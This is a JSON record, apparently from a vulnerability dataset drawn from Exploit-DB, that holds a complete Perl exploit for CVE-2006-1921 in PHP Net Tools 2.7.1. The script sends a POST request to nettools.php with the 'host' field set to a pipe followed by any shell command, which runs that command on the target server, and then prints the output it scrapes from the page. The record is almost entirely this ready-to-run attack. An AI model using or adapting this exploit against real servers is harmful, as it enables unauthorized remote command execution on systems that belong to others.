{
  "id": "1695",
  "title": "PHP Net Tools 2.7.1 - Remote Code Execution",
  "cve": "CVE-2006-1921",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n# PHP Net Tools Remote Code Execution Exploit\r\n#\r\n# by FOX_MULDER (fox_mulder@abv.bg)\r\n# Vulnerability found by FOX_MULDER.\r\n#\r\n# \"Born to be root !!!\"\r\n#----------------------------------+\r\n#PHP Net Tools                     |\r\n#Copyright (C) 2005 Eric Robertson |\r\n#h4rdc0d3@gmail.com                |\r\n#----------------------------------+\r\n#\r\n# Fact:Wbyte counted twice to infinity !!!\r\n#\r\n#\r\n###################################################\r\n\tuse LWP 5.64;\r\n\r\n\tmy $hostname = $ARGV[0];\r\n\tmy $dir = $ARGV[1];\r\n\tmy $command = $ARGV[2];\r\n\r\n        if (@ARGV<2) {\r\n\tprint \"\\nUsage: ntools.pl www.site.com /dir/ \\\"ls \\-la\\\" \\n\";\r\n\texit();\r\n\t}\r\n\t\r\n\tprint \"=======================================================\\n\";\r\n\tprint \"0day 0day 0day 0day 0day 0day 0day 0day 0day 0day 0day\\n\";\r\n\tprint \"PHP Net Tools Command Execution Exploit by FOX_MULDER\\n\";\r\n\tprint \"fox_mulder@abv.bg\\r\\n\";\r\n\tprint \"=======================================================\\n\";\r\n\r\n\tmy $browser = LWP::UserAgent->new;\r\n\t$browser->agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');\r\n\tprint \"\\n\\n[+]Sending request to server . . .\\r\\n\";\r\n\t\r\n\tmy $url = \"http://$hostname$dir/nettools.php\";\r\n\r\n\t\r\n\tmy $response = $browser->post( $url,[\r\n\t\t'ping' => '1',\r\n        \t'host' => \"|$command\"]);\r\n\r\n \tmy $code = $response->status_line;\r\n        print \"[+] HTTP RESPONSE $code\\n\";\r\n        print \"\\n[+]Injecting command . . .\\n\";\r\n\t$response->content =~ /blockquote>(.*)<\\/blockquote>/s;\r\n\tprint \"$1\\n\";\r\n\r\n# milw0rm.com [2006-04-18]",
  "url": "https://www.exploit-db.com/exploits/1695"
}